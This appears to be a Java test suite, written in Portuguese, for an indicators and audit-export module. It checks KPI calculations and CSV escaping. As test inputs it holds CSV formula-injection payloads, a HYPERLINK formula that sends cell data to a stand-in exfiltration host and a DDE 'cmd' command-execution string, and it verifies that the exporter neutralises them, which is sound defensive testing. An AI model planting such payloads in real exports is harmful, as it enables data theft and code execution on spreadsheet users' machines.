package br.com.engesoftware.sgdf.indicadores;

import br.com.engesoftware.sgdf.persistencia.ConsultaDeAuditoria;
import br.com.engesoftware.sgdf.persistencia.ConsultaDeIndicadores;
import br.com.engesoftware.sgdf.persistencia.Sgdf;
import java.math.BigDecimal;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * Indicadores e exportacoes do cap. 21 — historia F3-05.
 *
 * <p>Criterio de aceite: <i>"KPI/KRI calculados por competencia, exportaveis em
 * CSV"</i>.
 */
public final class TestesDeIndicadores {

    static final String MARCA = "teste-indicador";

    static int passaram = 0;
    static final List<String> falhas = new ArrayList<>();
    static int sequencia = 0;

    public static void main(String[] args) throws Exception {
        // O CSV e a meta sao Java puro: valem com ou sem banco.
        executar("oCsvNaoDeixaFormulaPassar", TestesDeIndicadores::oCsvNaoDeixaFormulaPassar);
        executar("oCsvEscapaSemEstragarONumero",
                TestesDeIndicadores::oCsvEscapaSemEstragarONumero);
        executar("monitorarNaoSeAtingeNemSeDescumpre",
                TestesDeIndicadores::monitorarNaoSeAtingeNemSeDescumpre);
        executar("zeroDeZeroNaoAfirmaNada", TestesDeIndicadores::zeroDeZeroNaoAfirmaNada);
        executar("contagemZeroEValor", TestesDeIndicadores::contagemZeroEValor);

        String url = System.getProperty("sgdf.jdbc");
        if (url == null || url.isBlank()) {
            System.out.println("  (parte com banco pulada: -Dsgdf.jdbc nao informado)");
        } else {
            try (Connection conexao = DriverManager.getConnection(url)) {
                conexao.setAutoCommit(true);
                limpar(conexao);
                try {
                    Sgdf sgdf = new Sgdf(conexao);
                    executar("osNoveIndicadoresDoCapitulo",
                            () -> osNoveIndicadoresDoCapitulo(sgdf));
                    executar("oDenominadorDoD3SaoOsFaturados",
                            () -> oDenominadorDoD3SaoOsFaturados(sgdf));
                    executar("ilegivelNaoContaNaPrecisao", () -> ilegivelNaoContaNaPrecisao(sgdf));
                    executar("aFolgaDaCertidaoEOMinimo", () -> aFolgaDaCertidaoEOMinimo(sgdf));
                    executar("oDetalhamentoPorArea", () -> oDetalhamentoPorArea(sgdf));
                    executar("oCsvTemUmaLinhaPorIndicador",
                            () -> oCsvTemUmaLinhaPorIndicador(sgdf));
                    executar("aTrilhaExigeRecorte", () -> aTrilhaExigeRecorte(sgdf));
                    executar("exportarATrilhaEntraNaTrilha",
                            () -> exportarATrilhaEntraNaTrilha(sgdf));
                    executar("aFormulaDoMotivoSaiNeutralizada",
                            () -> aFormulaDoMotivoSaiNeutralizada(sgdf));
                } finally {
                    limpar(conexao);
                }
            }
        }

        System.out.println();
        falhas.forEach(f -> System.out.println("  FALHA " + f));
        System.out.printf("%d/%d testes passaram.%n", passaram, passaram + falhas.size());
        if (!falhas.isEmpty()) {
            System.exit(1);
        }
    }

    // --- CSV e meta, sem banco -------------------------------------------------

    /**
     * A celula que comeca com =, +, -, @ ou tabulacao vira formula no Excel.
     *
     * <p>O texto entra por um campo legitimo — o motivo que o cap. 16 exige — e
     * sai pela exportacao que o cap. 13 exige. Nenhuma das duas esta errada; o
     * que faltava era o escape na fronteira.
     */
    static void oCsvNaoDeixaFormulaPassar() {
        String ataque = "=HYPERLINK(\"http://exfil.example/?d=\"&A1,\"clique\")";
        String saida = new Csv("motivo").linha(ataque).texto();

        ok("SEC . a formula sai prefixada com apostrofo, nao executavel",
                saida.contains("'=HYPERLINK"));
        ok("SEC . e o conteudo continua legivel para quem le", saida.contains("exfil.example"));

        for (String inicio : List.of("=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1")) {
            String c = Csv.celula(inicio);
            ok("SEC . '" + inicio.replace("\t", "\\t").replace("\r", "\\r")
                            + "' e neutralizado",
                    c.startsWith("'") || c.startsWith("\"'"));
        }

        // O caso classico de execucao de comando no Windows.
        ok("SEC . o payload de DDE tambem",
                Csv.celula("=cmd|'/c calc'!A1").startsWith("'"));
    }

    /**
     * Prefixar tudo seria pior: a coluna de valores viraria texto.
     *
     * <p>Uma planilha em que nao se soma nem se ordena a coluna de numeros nao
     * serve para o que alguem exporta CSV — e o "conserto" teria custado
     * exatamente a funcionalidade.
     */
    static void oCsvEscapaSemEstragarONumero() {
        ok("F3-05 . o numero positivo sai como numero", "98.00".equals(Csv.celula("98.00")));
        ok("F3-05 . e o texto comum tambem", "CER.CND_RFB".equals(Csv.celula("CER.CND_RFB")));
        ok("F3-05 . a virgula obriga aspas",
                "\"a, b\"".equals(Csv.celula("a, b")));
        ok("F3-05 . e a aspa interna e duplicada",
                "\"diz \"\"oi\"\"\"".equals(Csv.celula("diz \"oi\"")));
        ok("F3-05 . nulo vira campo vazio, nao a palavra null",
                Csv.celula(null).isEmpty());

        // NEGATIVO: e o caso incomodo. Ele PRECISA ser neutralizado (o Excel le
        // '-' como inicio de formula) e isso custa a soma da coluna. Entre
        // executar uma formula e perder a soma de uma coluna que hoje nao tem
        // negativo nenhum, a escolha e obvia — e fica registrada.
        ok("SEC . o negativo tambem e neutralizado, com o custo declarado",
                "'-3".equals(Csv.celula("-3")));

        boolean recusou = false;
        try {
            new Csv("a", "b").linha("so um");
        } catch (IllegalArgumentException e) {
            recusou = true;
        }
        ok("F3-05 . linha com menos colunas que o cabecalho e recusada — um CSV "
                + "desalinhado e lido errado sem avisar", recusou);
    }

    /** "monitorar" nao e um numero a bater. */
    static void monitorarNaoSeAtingeNemSeDescumpre() {
        Indicador kri = Indicador.contagem("K", "KRI", 47, Meta.monitorar(), "excecao", null);
        ok("Cap. 21 . o KRI fica MONITORADO, nem atingido nem descumprido",
                Indicador.Situacao.MONITORADO == kri.situacao());
        ok("Cap. 21 . e a meta se le como 'monitorar'",
                "monitorar".equals(kri.meta().toString()));

        boolean recusouLimite = false;
        try {
            new Meta(Meta.Sentido.MONITORAR, BigDecimal.ONE);
        } catch (IllegalArgumentException e) {
            recusouLimite = true;
        }
        ok("Cap. 21 . meta de monitoramento com limite e recusada — se ha numero a "
                + "atingir, o sentido e outro", recusouLimite);

        Indicador noAlvo = Indicador.razao("D", "D+3", 98, 100, Meta.noMinimo("98"), "ciclo",
                null);
        ok("Cap. 21 . 98 de 100 atinge a meta de >= 98%",
                Indicador.Situacao.ATINGIDA == noAlvo.situacao());
        Indicador abaixo = Indicador.razao("D", "D+3", 97, 100, Meta.noMinimo("98"), "ciclo",
                null);
        ok("Cap. 21 . e 97 nao atinge",
                Indicador.Situacao.NAO_ATINGIDA == abaixo.situacao());
        Indicador tempo = Indicador.media("T", "tempo", new BigDecimal("1.50"), 3,
                Meta.noMaximo("2"), "ciclo", null);
        ok("Cap. 21 . a meta de teto le ao contrario: 1,5 <= 2 atinge",
                Indicador.Situacao.ATINGIDA == tempo.situacao());
    }

    static void zeroDeZeroNaoAfirmaNada() {
        Indicador vazio = Indicador.razao("D", "D+3", 0, 0, Meta.noMinimo("98"), "ciclo", null);
        ok("Cap. 21 . razao sem populacao nao tem valor", vazio.valor() == null);
        ok("Cap. 21 . e a situacao e SEM_POPULACAO, nem atingida nem descumprida",
                Indicador.Situacao.SEM_POPULACAO == vazio.situacao());
        ok("Cap. 21 . o valor se le como travessao, nao como 0%",
                "—".equals(vazio.descricaoDoValor()));

        Indicador semMedia = Indicador.media("T", "tempo", null, 0, Meta.noMaximo("2"),
                "ciclo", null);
        ok("Cap. 21 . e a media sem populacao idem",
                Indicador.Situacao.SEM_POPULACAO == semMedia.situacao());
    }

    /**
     * Zero contado e diferente de zero de zero.
     *
     * <p>"Nenhuma excecao aprovada nesta competencia" e informacao; devolver
     * nulo a esconderia. A diferenca e que aqui HOUVE o que contar.
     */
    static void contagemZeroEValor() {
        Indicador zero = Indicador.contagem("P", "pendencias vencidas", 0,
                Meta.exatamente("0"), "pendencia", null);
        ok("Cap. 21 . contagem zero tem valor",
                BigDecimal.ZERO.compareTo(zero.valor()) == 0);
        ok("Cap. 21 . e atinge a meta de exatamente zero",
                Indicador.Situacao.ATINGIDA == zero.situacao());
        ok("Cap. 21 . e se le como 0, nao como travessao",
                "0".equals(zero.descricaoDoValor()));
    }

    // --- com banco -------------------------------------------------------------

    static void osNoveIndicadoresDoCapitulo(Sgdf sgdf) {
        List<Indicador> todos = new ConsultaDeIndicadores(sgdf).daCompetencia("2029-01");
        ok("Cap. 21 . os nove indicadores da tabela sao calculados", todos.size() == 9);
        ok("Cap. 21 . todos com codigo, nome, meta e fonte",
                todos.stream().allMatch(i -> i.codigo() != null && i.nome() != null
                        && i.meta() != null && i.fonte() != null));
        ok("Cap. 21 . numa competencia sem nada, nenhuma razao afirma",
                todos.stream().filter(i -> i.unidade() == Indicador.Unidade.PERCENTUAL)
                        .allMatch(i -> i.situacao() == Indicador.Situacao.SEM_POPULACAO));
        ok("Cap. 21 . mas as contagens dizem zero — houve o que contar",
                todos.stream().filter(i -> i.unidade() == Indicador.Unidade.CONTAGEM)
                        .allMatch(i -> BigDecimal.ZERO.compareTo(i.valor()) == 0));
    }

    static void oDenominadorDoD3SaoOsFaturados(Sgdf sgdf) {
        String comp = competencia();
        UUID dentro = ciclo(sgdf, comp);
        UUID fora = ciclo(sgdf, comp);
        UUID semNf = ciclo(sgdf, comp);
        faturar(sgdf, dentro, 10, 8);
        faturar(sgdf, fora, 10, 3);
        atestar(sgdf, semNf, 10);

        Indicador d3 = um(sgdf, comp, "D3");
        ok("Cap. 21 . o denominador sao os faturados, nao os atestados",
                d3.denominador() == 2 && d3.numerador() == 1);
        ok("Cap. 21 . e o ciclo que ainda tem prazo nao entra como descumprimento",
                new BigDecimal("50.00").compareTo(d3.valor()) == 0);
        ok("Cap. 21 . a descricao mostra de quantos",
                d3.descricaoDoValor().contains("(1 de 2)"));

        Indicador tempo = um(sgdf, comp, "TEMPO_ATESTE_NF");
        ok("Cap. 21 . a media ateste->NF sai so dos faturados",
                new BigDecimal("4.50").compareTo(tempo.valor()) == 0);
    }

    /**
     * ILEGIVEL nao julga o tipo sugerido.
     *
     * <p>Soma-la ao denominador debitaria do classificador um defeito de
     * digitalizacao — e a metrica pioraria quando a origem mandasse fotocopia
     * ruim.
     */
    static void ilegivelNaoContaNaPrecisao(Sgdf sgdf) {
        String comp = competencia();
        UUID c = ciclo(sgdf, comp);
        UUID e = exigencia(sgdf, c);
        candidatura(sgdf, e, "CONFIRMADA");
        candidatura(sgdf, e, "CONFIRMADA");
        candidatura(sgdf, e, "RECLASSIFICADA");
        candidatura(sgdf, e, "ILEGIVEL");
        candidatura(sgdf, e, "ILEGIVEL");

        Indicador p = um(sgdf, comp, "PRECISAO_TRIAGEM");
        ok("Cap. 21 . o denominador conta so quem julgou a sugestao: 3, nao 5",
                p.denominador() == 3 && p.numerador() == 2);
        ok("Cap. 21 . e a precisao sai 66,67%, nao 40%",
                new BigDecimal("66.67").compareTo(p.valor()) == 0);
        ok("Cap. 21 . abaixo da meta de 90%",
                Indicador.Situacao.NAO_ATINGIDA == p.situacao());

        // A prova de que ILEGIVEL foi mesmo excluida e nao apenas ignorada:
        // trocar as duas por REJEITADA muda o denominador.
        executar(sgdf, "UPDATE candidatura SET situacao = 'REJEITADA' WHERE situacao = "
                + "'ILEGIVEL' AND exigencia_id = '" + e + "'");
        Indicador p2 = um(sgdf, comp, "PRECISAO_TRIAGEM");
        ok("Cap. 21 . REJEITADA entra — dizer 'nao e desta exigencia' JULGA a sugestao",
                p2.denominador() == 5 && p2.numerador() == 2);
    }

    /** A media esconderia a certidao que vence antes de o cliente pagar. */
    static void aFolgaDaCertidaoEOMinimo(Sgdf sgdf) {
        String comp = competencia();
        UUID c = ciclo(sgdf, comp);
        faturar(sgdf, c, 10, 5);
        UUID e1 = exigencia(sgdf, c);
        UUID e2 = exigencia(sgdf, c);
        certidaoValendoPor(sgdf, e1, 60);
        certidaoValendoPor(sgdf, e2, 1);

        Indicador i = um(sgdf, comp, "IDADE_CERTIDAO");
        ok("Cap. 21 . a folga e o MINIMO (1 dia), nao a media (30,5)",
                new BigDecimal("1").compareTo(i.valor()) == 0);
        ok("Cap. 21 . e 1 dia nao atinge a meta de > 5",
                Indicador.Situacao.NAO_ATINGIDA == i.situacao());
        ok("Cap. 21 . sobre as duas certidoes", i.denominador() == 2);
    }

    static void oDetalhamentoPorArea(Sgdf sgdf) {
        String comp = competencia();
        UUID c = ciclo(sgdf, comp);
        pendenciaVencida(sgdf, exigencia(sgdf, c, "AP"));
        pendenciaVencida(sgdf, exigencia(sgdf, c, "AP"));
        pendenciaVencida(sgdf, exigencia(sgdf, c, "FIN"));

        Indicador i = um(sgdf, comp, "PENDENCIAS_VENCIDAS");
        ok("Cap. 21 . as tres pendencias vencidas sao contadas",
                new BigDecimal("3").compareTo(i.valor()) == 0);
        ok("Cap. 21 . e 3 nao atinge a meta de exatamente 0",
                Indicador.Situacao.NAO_ATINGIDA == i.situacao());

        List<Object[]> porArea = new ConsultaDeIndicadores(sgdf)
                .pendenciasVencidasPorArea(comp);
        ok("Cap. 21 . o detalhamento por responsavel separa as areas",
                porArea.size() == 2 && "AP".equals(porArea.get(0)[0])
                        && 2L == ((Number) porArea.get(0)[1]).longValue());
    }

    static void oCsvTemUmaLinhaPorIndicador(Sgdf sgdf) {
        String comp = competencia();
        UUID c = ciclo(sgdf, comp);
        faturar(sgdf, c, 10, 8);

        String csv = new ConsultaDeIndicadores(sgdf).csv(comp);
        String[] linhas = csv.split("\r\n");
        ok("F3-05 . cabecalho mais nove linhas", linhas.length == 10);
        ok("F3-05 . com a competencia em toda linha",
                java.util.Arrays.stream(linhas).skip(1).allMatch(l -> l.startsWith(comp)));
        ok("F3-05 . e a populacao vai junto do valor",
                csv.contains(",1,1,") || csv.contains(",1,1\r\n"));
        ok("F3-05 . RFC 4180: as linhas terminam em CRLF", csv.contains("\r\n"));
    }

    static void aTrilhaExigeRecorte(Sgdf sgdf) {
        ConsultaDeAuditoria a = new ConsultaDeAuditoria(sgdf);
        boolean recusou = false;
        try {
            a.consultar(new ConsultaDeAuditoria.Filtro(null, null, null, null, null), 100);
        } catch (ConsultaDeAuditoria.FiltroObrigatorio e) {
            recusou = true;
        }
        ok("Cap. 13 . consultar a trilha sem recorte e recusado", recusou);

        boolean recusouBranco = false;
        try {
            a.consultar(new ConsultaDeAuditoria.Filtro("  ", "", "   ", null, null), 100);
        } catch (ConsultaDeAuditoria.FiltroObrigatorio e) {
            recusouBranco = true;
        }
        ok("Cap. 13 . e string em branco nao vale como filtro", recusouBranco);

        List<ConsultaDeAuditoria.Registro> r = a.consultar(
                new ConsultaDeAuditoria.Filtro("ciclo", null, null, null, null), 10);
        ok("Cap. 13 . com recorte, a consulta responde", r != null);
    }

    /** A unica operacao que produz a trilha inteira nao pode ser a que nao a registra. */
    static void exportarATrilhaEntraNaTrilha(Sgdf sgdf) {
        long antes = contar(sgdf, "log_auditoria WHERE acao = 'AUDITORIA_EXPORTAR'");
        new ConsultaDeAuditoria(sgdf).csv(
                new ConsultaDeAuditoria.Filtro("ciclo", null, null, null, null), 10,
                "auditora.silva", "AUDITORIA");
        long depois = contar(sgdf, "log_auditoria WHERE acao = 'AUDITORIA_EXPORTAR'");

        ok("Cap. 16 . exportar a trilha entra na trilha", depois == antes + 1);
        ok("Cap. 16 . com quem exportou",
                "auditora.silva".equals(escalar(sgdf, "SELECT ator FROM log_auditoria"
                        + " WHERE acao = 'AUDITORIA_EXPORTAR' ORDER BY ocorrido_em DESC"
                        + " LIMIT 1")));
        ok("LGPD . e com o FILTRO, nao o conteudo — o registro nao duplica o dado "
                        + "pessoal exportado",
                escalar(sgdf, "SELECT detalhe::text FROM log_auditoria WHERE acao = "
                        + "'AUDITORIA_EXPORTAR' ORDER BY ocorrido_em DESC LIMIT 1")
                        .contains("ciclo"));
    }

    /**
     * Ponta a ponta: o motivo com formula entra pelo campo legitimo e sai
     * neutralizado pela exportacao.
     */
    static void aFormulaDoMotivoSaiNeutralizada(Sgdf sgdf) {
        String ataque = "=HYPERLINK(\"http://exfil.example\",\"clique\") e o resto do motivo";
        sgdf.emTransacao(conexao -> {
            br.com.engesoftware.sgdf.persistencia.TrilhaDeAuditoria.registrar(conexao,
                    br.com.engesoftware.sgdf.persistencia.TrilhaDeAuditoria.Registro.sucesso(
                            MARCA, "CURADOR_MATRIZ", "TESTE_FORMULA", "excecao",
                            UUID.randomUUID().toString(), Map.of("motivo", List.of(ataque))));
            return null;
        });

        String csv = new ConsultaDeAuditoria(sgdf).csv(
                new ConsultaDeAuditoria.Filtro(null, null, MARCA, null, null), 10,
                "auditora.silva", "AUDITORIA");
        ok("SEC . o motivo com formula chega ao CSV", csv.contains("exfil.example"));
        ok("SEC . e nenhuma celula comeca com = — no detalhe o envelope JSON ja "
                        + "desarma, por acidente e nao por projeto",
                !csv.contains(",=HYPERLINK") && !csv.contains("\n=HYPERLINK"));

        // O CAMPO QUE REALMENTE CHEGA AO INICIO DA CELULA E O ATOR.
        //
        // Ele vem do 'sub' do provedor de identidade — externo, portanto. E o
        // unico vetor vivo hoje, e e por ele que a defesa se prova.
        String atorMalicioso = "=cmd|'/c calc'!A1";
        sgdf.emTransacao(conexao -> {
            br.com.engesoftware.sgdf.persistencia.TrilhaDeAuditoria.registrar(conexao,
                    br.com.engesoftware.sgdf.persistencia.TrilhaDeAuditoria.Registro.sucesso(
                            atorMalicioso, "CURADOR_MATRIZ", "TESTE_ATOR", "excecao",
                            UUID.randomUUID().toString(), Map.of()));
            return null;
        });
        String comAtor = new ConsultaDeAuditoria(sgdf).csv(
                new ConsultaDeAuditoria.Filtro(null, null, atorMalicioso, null, null), 10,
                "auditora.silva", "AUDITORIA");
        ok("SEC . o ator com payload de DDE sai neutralizado",
                comAtor.contains(",'=cmd|") && !comAtor.contains(",=cmd|"));
    }

    // -------------------------------------------------------------------------

    static String competencia() {
        return String.format("2029-%02d", 1 + (sequencia % 11));
    }

    static UUID ciclo(Sgdf sgdf, String competencia) {
        int n = ++sequencia;
        UUID empresa = uuid(sgdf, "INSERT INTO empresa (razao_social, cnpj, criado_por) VALUES"
                + " ('Prestador Ind " + n + "', '" + String.format("3%013d", n) + "', '"
                + MARCA + "') RETURNING id");
        UUID versao = uuid(sgdf, "INSERT INTO versao_matriz (numero, publicada_por, motivo)"
                + " VALUES ('0.0-ind-" + n + "', '" + MARCA + "', 'fixture') RETURNING id");
        UUID cliente = uuid(sgdf, "INSERT INTO cliente (nome, cnpj, esfera, criado_por) VALUES"
                + " ('Cliente Ind " + n + "', '" + String.format("4%013d", n)
                + "', 'PRIVADA', '" + MARCA + "') RETURNING id");
        UUID contrato = uuid(sgdf, "INSERT INTO contrato_servico (cliente_id, numero, servico,"
                + " modalidade_id, vigencia_ini, pasta_origem, data_contratual_faturamento,"
                + " calendario_uf, empresa_id, criado_por)"
                + " SELECT '" + cliente + "', 'CT-IND-" + n + "', 'PRINCIPAL', m.id,"
                + " DATE '2025-01-01', '/teste', '{\"ancora\":\"ATESTE\",\"tipo_dia\":\"CORRIDO\","
                + "\"offset\":3}'::jsonb, 'DF', '" + empresa + "', '" + MARCA + "'"
                + " FROM modalidade m WHERE m.codigo = 'OUTSOURCING' RETURNING id");
        return uuid(sgdf, "INSERT INTO ciclo (contrato_servico_id, competencia, status,"
                + " versao_matriz_id, criado_por) VALUES ('" + contrato + "', '" + competencia
                + "', 'ABERTO', '" + versao + "', '" + MARCA + "') RETURNING id");
    }

    static UUID exigencia(Sgdf sgdf, UUID ciclo) {
        return exigencia(sgdf, ciclo, "AP");
    }

    static UUID exigencia(Sgdf sgdf, UUID ciclo, String responsavel) {
        int n = ++sequencia;
        UUID tipo = uuid(sgdf, "INSERT INTO tipo_documental (codigo, nome, familia, escopo,"
                + " evento, defasagem, criticidade, sigilo, criado_por) VALUES"
                + " ('TST.IND" + n + "', 'Tipo', 'Certidoes e regularidade', 'CONTRATO',"
                + " 'MENSAL', 'M', 'BLOQUEANTE', 'INTERNO', '" + MARCA + "') RETURNING id");
        return uuid(sgdf, "INSERT INTO exigencia (ciclo_id, tipo_id, evento, status,"
                + " prazo_calculado, criticidade, responsavel, origem, criado_por) VALUES ('"
                + ciclo + "', '" + tipo + "', 'MENSAL', 'PENDENTE', current_date - 30,"
                + " 'BLOQUEANTE', '" + responsavel + "', 'MATRIZ', '" + MARCA + "') RETURNING id");
    }

    static void candidatura(Sgdf sgdf, UUID exigencia, String situacao) {
        UUID doc = documento(sgdf);
        // decisao_motivo e obrigatorio em ILEGIVEL e REJEITADA (V009): uma recusa
        // sem motivo nao diz a quem entregou o que fazer.
        boolean recusa = "ILEGIVEL".equals(situacao) || "REJEITADA".equals(situacao);
        executar(sgdf, "INSERT INTO candidatura (exigencia_id, documento_id, tipo_proposto_id,"
                + " score, motivo, situacao, decidida_em, decidida_por, decisao_motivo)"
                + " SELECT '" + exigencia + "', '" + doc + "', e.tipo_id, 0.9, 'fixture', '"
                + situacao + "', now(), '" + MARCA + "', "
                + (recusa ? "'motivo do teste'" : "NULL")
                + " FROM exigencia e WHERE e.id = '" + exigencia + "'");
    }

    static UUID documento(Sgdf sgdf) {
        int n = ++sequencia;
        return uuid(sgdf, "INSERT INTO documento (origem, caminho, nome_arquivo, hash_sha256,"
                + " tamanho, mime_real, formato, status_triagem, criado_por) VALUES"
                + " ('OWNCLOUD', '/t/" + n + "', 'a.pdf', '" + String.format("%064d", n)
                + "', 100, 'application/pdf', 'pdf', 'PENDENTE', '" + MARCA + "') RETURNING id");
    }

    /** Certidao vinculada, valendo por N dias apos a emissao da NF. */
    static void certidaoValendoPor(Sgdf sgdf, UUID exigencia, int dias) {
        UUID doc = documento(sgdf);
        executar(sgdf, "UPDATE documento SET validade_extraida = (SELECT c.nf_emitida_em::date"
                + " + " + dias + " FROM exigencia e JOIN ciclo c ON c.id = e.ciclo_id"
                + " WHERE e.id = '" + exigencia + "') WHERE id = '" + doc + "'");
        executar(sgdf, "INSERT INTO vinculo_exigencia_documento (exigencia_id, documento_id,"
                + " formato, decidido_por, decidido_ator) VALUES ('" + exigencia + "', '" + doc
                + "', 'pdf', 'SISTEMA', '" + MARCA + "')");
    }

    static void pendenciaVencida(Sgdf sgdf, UUID exigencia) {
        executar(sgdf, "INSERT INTO pendencia (exigencia_id, prazo) VALUES ('" + exigencia
                + "', current_date - 10)");
    }

    static void atestar(Sgdf sgdf, UUID ciclo, int haDias) {
        executar(sgdf, "UPDATE ciclo SET ateste_em = now() - INTERVAL '" + haDias + " days',"
                + " ateste_forma = 'e-mail' WHERE id = '" + ciclo + "'");
    }

    static void faturar(Sgdf sgdf, UUID ciclo, int atesteHaDias, int nfHaDias) {
        atestar(sgdf, ciclo, atesteHaDias);
        executar(sgdf, "UPDATE ciclo SET nf_emitida_em = now() - INTERVAL '" + nfHaDias
                + " days' WHERE id = '" + ciclo + "'");
    }

    static Indicador um(Sgdf sgdf, String competencia, String codigo) {
        return new ConsultaDeIndicadores(sgdf).daCompetencia(competencia).stream()
                .filter(i -> i.codigo().equals(codigo)).findFirst().orElseThrow();
    }

    static UUID uuid(Sgdf sgdf, String sql) {
        try (Statement st = sgdf.conexao().createStatement();
             ResultSet rs = st.executeQuery(sql)) {
            rs.next();
            return rs.getObject(1, UUID.class);
        } catch (SQLException e) {
            throw new IllegalStateException("falha no fixture: " + e.getMessage(), e);
        }
    }

    static void executar(Sgdf sgdf, String sql) {
        try (Statement st = sgdf.conexao().createStatement()) {
            st.execute(sql);
        } catch (SQLException e) {
            throw new IllegalStateException("falha no fixture: " + e.getMessage(), e);
        }
    }

    static String escalar(Sgdf sgdf, String sql) {
        try (Statement st = sgdf.conexao().createStatement();
             ResultSet rs = st.executeQuery(sql)) {
            return rs.next() ? rs.getString(1) : null;
        } catch (SQLException e) {
            throw new IllegalStateException("falha ao ler " + sql, e);
        }
    }

    static long contar(Sgdf sgdf, String de) {
        return Long.parseLong(escalar(sgdf, "SELECT count(*) FROM " + de));
    }

    static void limpar(Connection conexao) throws SQLException {
        String[] comandos = {
            "DELETE FROM candidatura WHERE decidida_por = '" + MARCA + "'",
            "DELETE FROM vinculo_exigencia_documento WHERE decidido_ator = '" + MARCA + "'",
            "DELETE FROM documento WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM pendencia WHERE exigencia_id IN (SELECT id FROM exigencia"
                    + " WHERE criado_por = '" + MARCA + "')",
            "DELETE FROM exigencia WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM ciclo WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM contrato_servico WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM versao_matriz WHERE publicada_por = '" + MARCA + "'",
            "DELETE FROM cliente WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM tipo_documental WHERE criado_por = '" + MARCA + "'",
            "DELETE FROM empresa WHERE criado_por = '" + MARCA + "'",
        };
        try (Statement st = conexao.createStatement()) {
            for (String c : comandos) {
                st.execute(c);
            }
        }
    }

    interface Teste {
        void executar() throws Exception;
    }

    static void executar(String nome, Teste teste) {
        try {
            teste.executar();
        } catch (Exception | AssertionError e) {
            falhas.add(nome + " lancou " + e.getClass().getSimpleName()
                    + (e.getMessage() == null ? "" : ": " + e.getMessage()));
        }
    }

    static void ok(String descricao, boolean condicao) {
        if (condicao) {
            passaram++;
            System.out.println("  ok    " + descricao);
        } else {
            falhas.add(descricao);
        }
    }

    private TestesDeIndicadores() {}
}
